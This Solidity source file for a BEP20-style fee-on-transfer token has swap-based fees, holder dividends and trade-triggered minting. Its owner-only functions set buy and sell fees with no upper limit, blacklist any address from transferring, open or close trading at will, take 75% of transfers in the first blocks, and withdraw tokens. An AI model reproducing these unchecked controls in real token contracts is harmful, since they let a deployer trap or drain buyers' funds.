// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

import "./IERC20.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./Ownable.sol";
import "./ISwapRouter.sol";
import "./ISwapFactory.sol";
import "./SMCWarp.sol";
import "./ISwapPair.sol";

abstract contract ImpToken is IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) private _blackList;
    mapping(address => bool) private _excludeMinerList;
    mapping(address => bool) private _swapPairList;

    address private fundAddress;
    address private _fist;
    address private _mainPair;
    address private platform;
    address public DEAD = address(0x000000000000000000000000000000000000dEaD);
    address public ZERO = address(0);

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;
    uint256 private _initTotal;
    uint256 private _maxTotal;

    ISwapRouter public _swapRouter;
    SMCWarp warp;

    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public liquifyEnabled = false;
    bool private swapInMineEnabled = false;
    bool private swapOutMineEnabled = false;
    bool private coverAllFeeEnabled = false;

    uint256 public _buyBurnFee = 100;
    uint256 public _sellBurnFee = 100;
    uint256 public _buyFundFee = 100;
    uint256 public _sellFundFee = 100;
    uint256 public _buyLPDividendFee = 100;
    uint256 public _sellLPDividendFee = 100;
    uint256 public _buyLPFee = 100;
    uint256 public _sellLPFee = 100;

    uint256 public _buySmsBurnFee = 100;
    uint256 public _sellSmsBurnFee = 100;
    uint256 public _buySmsFundFee = 100;
    uint256 public _sellSmsFundFee = 100;
    uint256 public _buySmsLPDividendFee = 100;
    uint256 public _sellSmsLPDividendFee = 100;
    uint256 public _buySmsLPFee = 100;
    uint256 public _sellSmsLPFee = 100;

    uint256 private constant MAX = ~uint256(0);
    uint256 private numTokensSellToAddToLiquidity;
    uint256 private numTokensSellToMine;
    uint256 private numTokensBuyToMine;
    uint256 private rateMineBase;
    uint256 private coverAllFeeBlock;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 private holderRewardCondition;

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, uint256 MaxSupply, uint256 minNum,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        numTokensSellToAddToLiquidity = minNum * 10 ** uint256(_decimals);

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        _initTotal = total;
        _maxTotal = MaxSupply * 10 ** Decimals;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        platform = owner();

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[ZERO] = true;
        excludeHolder[DEAD] = true;

        _excludeMinerList[address(this)] = true;
        _excludeMinerList[address(swapRouter)] = true;
        _excludeMinerList[swapPair] = true;
        _excludeMinerList[ZERO] = true;
        _excludeMinerList[DEAD] = true;

        holderRewardCondition = 100 * 10 ** IERC20(FISTAddress).decimals();
        numTokensBuyToMine = 1 * 10 ** Decimals;
        numTokensSellToMine = 100 * 10 ** IERC20(FISTAddress).decimals() * 10 ** Decimals;
        rateMineBase = 1 * 10 ** Decimals;
    }

    receive() external payable {}

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        bool takeFee;
        bool isSell;
        bool isBuy;
        uint256 swapForFistAmount;

        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(!_blackList[from] && !_blackList[to], "BEP20: sender or recipient in blackList");

        uint256 fromBalance = balanceOf(from);
        require(fromBalance >= amount, "BEP20: transfer amount exceeds balance");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = fromBalance.mul(9999).div(10000);
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        if(!isContract(from) && to == DEAD) {
            uint256 burnTotal = balanceOf(DEAD);
            uint256 maxBurnAmount = _tTotal.sub(_initTotal).sub(burnTotal);
            if(amount > maxBurnAmount) {
                amount = maxBurnAmount;
            }
        }

        if(
            _tTotal >= _maxTotal &&
            coverAllFeeEnabled &&
            coverAllFeeBlock == 0
        ) {
            _buyBurnFee = _buySmsBurnFee;
            _sellBurnFee = _sellSmsBurnFee;
            _buyFundFee = _buySmsFundFee;
            _sellFundFee = _sellSmsFundFee;
            _buyLPDividendFee = _buySmsLPDividendFee;
            _sellLPDividendFee = _sellSmsLPDividendFee;
            _buyLPFee = _buySmsLPFee;
            _sellLPFee = _sellSmsLPFee;

            coverAllFeeBlock = block.number;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            swapForFistAmount = amount.mul(getCurPrice());
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "BEP20:operater action is not AddLiquidity");
                }
                if (block.number < startTradeBlock.add(4)) {
                    _funTransfer(from, to, amount);
                    return;
                }

                uint256 swapFee = _buyFundFee.add(_sellFundFee).add(_buyLPDividendFee).add(_sellLPDividendFee).add(_buyLPFee).add(_sellLPFee);

                // also, don't swap & liquify if sender is uniswap pair.
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
                if (
                    overMinTokenBalance &&
                    !inSwapAndLiquify &&
                    _swapPairList[to] &&
                    swapAndLiquifyEnabled
                ) {
                    contractTokenBalance = numTokensSellToAddToLiquidity;
                    //add liquidity
                    swapTokenForFund(contractTokenBalance, swapFee);
                }

                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            } else {
                isBuy = true;
            }
            
        }
        
        _tokenTransfer(from, to, amount, takeFee, isSell);
        _tokenMiner(from, to, amount, swapForFistAmount, isSell, isBuy);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);
        uint256 feeAmount = tAmount.mul(75).div(100);
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        
        uint256 feeAmount;

        _balances[sender] = _balances[sender].sub(tAmount);

        if (takeFee) {
            uint256 swapFee;
            uint256 burnAmount;
            uint256 burnTotal = balanceOf(DEAD);
            if (isSell) {
                swapFee = _sellFundFee.add(_sellLPDividendFee).add(_sellLPFee);
                burnAmount = tAmount.mul(_sellBurnFee).div(10000);
            } else {
                swapFee = _buyFundFee.add(_buyLPDividendFee).add(_buyLPFee);
                burnAmount = tAmount.mul(_buyBurnFee).div(10000);
            }
            uint256 swapAmount = tAmount.mul(swapFee).div(10000);
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            if(
                burnAmount > 0 &&
                _tTotal.sub(burnTotal) > _initTotal
            ) {
                if(burnAmount > _tTotal.sub(burnTotal).sub(_initTotal)) {
                    burnAmount = _tTotal.sub(burnTotal).sub(_initTotal);
                }
                feeAmount += burnAmount;
                _takeTransfer(sender, DEAD, burnAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _tokenMiner(
        address sender,
        address recipient,
        uint256 amount,
        uint256 swapForFistAmount,
        bool isSell,
        bool isBuy
    ) private {
        if(
            isSell &&
            swapOutMineEnabled &&
            swapForFistAmount >= numTokensSellToMine &&
            !_excludeMinerList[sender] &&
            !isContract(sender) &&
            isContract(recipient) &&
            _tTotal < _maxTotal
        ) {
            uint256 swapDouble = swapForFistAmount.div(numTokensSellToMine);
            uint256 mineAmount = rateMineBase.mul(swapDouble);
            if(mineAmount > _maxTotal.sub(_tTotal)) {
                mineAmount = _maxTotal.sub(_tTotal);
            }
            _balances[sender] = _balances[sender].add(mineAmount);
            _tTotal = _tTotal.add(mineAmount);
            emit Transfer(ZERO, sender, mineAmount);
        } else if(
            isBuy &&
            swapInMineEnabled &&
            amount >= numTokensBuyToMine &&
            !_excludeMinerList[recipient] &&
            !isContract(recipient) &&
            isContract(sender) &&
            _tTotal < _maxTotal
        ) {
            uint256 swapDouble = amount.div(numTokensBuyToMine);
            uint256 mineAmount = rateMineBase.mul(swapDouble);
            if(mineAmount > _maxTotal.sub(_tTotal)) {
                mineAmount = _maxTotal.sub(_tTotal);
            }
            _balances[recipient] = _balances[recipient].add(mineAmount);
            _tTotal = _tTotal.add(mineAmount);
            emit Transfer(ZERO, recipient, mineAmount);
        }
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount.mul(lpFee).div(swapFee);
        uint256 halflpAmount = lpAmount.div(2);
        uint256 otherlpAmount = lpAmount.sub(halflpAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - otherlpAmount,
            0,
            path,
            address(warp),
            block.timestamp
        );
        
        swapFee = swapFee.sub(lpFee.div(2));

        IERC20 FIST = IERC20(_fist);
        uint256 initialBalance = FIST.balanceOf(address(this));

        warp.withdraw();

        uint256 fistBalance = FIST.balanceOf(address(this)).sub(initialBalance);
        uint256 fundAmount = fistBalance.mul(_buyFundFee.add(_sellFundFee)).div(swapFee);
        if(fundAmount > 0 ) {
            FIST.transfer(fundAddress, fundAmount);
        }

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance.mul(lpFee).div(swapFee).div(2);
            if (lpFist > 0 && liquifyEnabled) {
                _swapRouter.addLiquidity(
                    address(this), _fist, otherlpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
                emit SwapAndLiquify(halflpAmount, lpFist, otherlpAmount);
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function setBuyBurnFee(uint256 burnFee) external onlyOwner {
        _buyBurnFee = burnFee;
    }

    function setBuySmsBurnFee(uint256 burnFee) external onlyOwner {
        _buySmsBurnFee = burnFee;
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuySmsLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buySmsLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setBuySmsFundFee(uint256 fundFee) external onlyOwner {
        _buySmsFundFee = fundFee;
    }

    function setSellBurnFee(uint256 burnFee) external onlyOwner {
        _sellBurnFee = burnFee;
    }

    function setSellSmsBurnFee(uint256 burnFee) external onlyOwner {
        _sellSmsBurnFee = burnFee;
    }

    function setBuyLPFee(uint256 lpFee) external onlyOwner {
        _buyLPFee = lpFee;
    }

    function setBuySmsLPFee(uint256 lpFee) external onlyOwner {
        _buySmsLPFee = lpFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellSmsLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellSmsLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellSmsFundFee(uint256 fundFee) external onlyOwner {
        _sellSmsFundFee = fundFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setSellSmsLPFee(uint256 lpFee) external onlyOwner {
        _sellSmsLPFee = lpFee;
    }

    function setSwapWarp(SMCWarp _warp) public onlyOwner {					
        warp = _warp;						
        _feeWhiteList[address(warp)] = true;						
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "BEP20: startAddLP has been set");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        require(startAddLPBlock > 0, "BEP20: startAddLP has not been set");
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "BEP20: startTrade has been set");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        require(startTradeBlock > 0, "BEP20: startTrade has not been set");
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    function setLiquifyEnabled(bool _enabled) public onlyOwner {
        liquifyEnabled = _enabled;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapInMineEnabled(bool _enabled) public onlyOwner {
        swapInMineEnabled = _enabled;
    }

    function setSwapOutMineEnabled(bool _enabled) public onlyOwner {
        swapOutMineEnabled = _enabled;
    }

    function setCoverAllFeeEnabled(bool _enabled) public onlyOwner {
        coverAllFeeEnabled = _enabled;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function getCurPrice() private view returns(uint _price){
        address t0 = ISwapPair(address(_mainPair)).token0();
        (uint r0,uint r1,) = ISwapPair(address(_mainPair)).getReserves();
        if( r0 > 0 && r1 > 0 ){
             if( t0 == address(this)){
                _price = r1 * 10 ** IERC20(_fist).decimals() / r0;
            }else{
                _price = r0 * 10 ** IERC20(_fist).decimals() / r1;
            }   
        }
    }

    function transToken(address token, address addr, uint256 amount) public {
        require(_msgSender() == platform, "BEP20: Caller is not platform and no permission");
        require(addr != address(0), "BEP20: Recipient address is zero");
        require(amount > 0, "BEP20: Transfer amount equal to zero");
        require(amount <= IERC20(token).balanceOf(address(this)), "BEP20: insufficient balance");
        Address.functionCall(token, abi.encodeWithSelector(0xa9059cbb, addr, amount));
    }

    function warpWithdraw() public onlyOwner {						
        warp.withdraw();						
    }

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock.add(200) > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance.mul(tokenBalance).div(holdTokenTotal);
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setNumTokensSellToAddToLiquidity(uint256 amount) external onlyOwner {
        numTokensSellToAddToLiquidity = amount;
    }

    function setNumTokensSellToMine(uint256 amount) external onlyOwner {
        numTokensSellToMine = amount;
    }

    function setNumTokensBuyToMine(uint256 amount) external onlyOwner {
        numTokensBuyToMine = amount;
    }

    function setRateMineBase(uint256 rate) external onlyOwner {
        rateMineBase = rate;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}